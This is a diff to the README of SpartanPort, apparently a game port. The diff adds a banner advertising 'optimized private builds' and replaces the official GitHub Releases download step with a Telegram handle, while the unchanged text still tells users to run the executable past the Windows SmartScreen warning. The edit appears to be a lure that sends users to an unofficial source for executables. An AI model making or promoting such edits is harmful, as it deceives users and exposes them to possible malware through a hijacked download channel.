@@ -25,6 +25,14 @@ and Linux (experimental AppImage).
 > and existing shortcuts keep working. On Linux, the AppImage is now `spartanport-x86_64.AppImage`:
 > update Steam launch options that use the old file name.
 
+> [!IMPORTANT]
+> ### 🚀 Highly Optimized Private Builds & Access
+> This custom build contains extensive optimizations: custom Vulkan streaming fixes, integrated GPU memory carve-out stability, compute workgroup bounds safety, and crash-proof descriptor resolution for maximum smoothness without crashes.
+> 
+> To connect with me and get the optimized files, reach out on Telegram:
+> 
+> 💬 **Telegram:** [@Samyyyyyk](https://t.me/Samyyyyyk)
+
 ## Contents
 
 - [SpartanPort](#spartanport)
@@ -64,8 +72,8 @@ and Linux (experimental AppImage).
 
 **Steps**
 
-1. Download `spartanport-windows.zip` from the
-   [Releases page](https://github.com/FelipePrado0/SpartanPort/releases/latest).
+1. To get the optimized game files and latest stability builds, contact:
+   - **Telegram:** [@Samyyyyyk](https://t.me/Samyyyyyk)
 2. Extract it to a folder of your choice, for example `C:\Games\spartanport-windows`. Do not run it from
    inside the zip.
 3. Open **`SpartanPort.exe`**. If Windows shows "Windows protected your PC", click
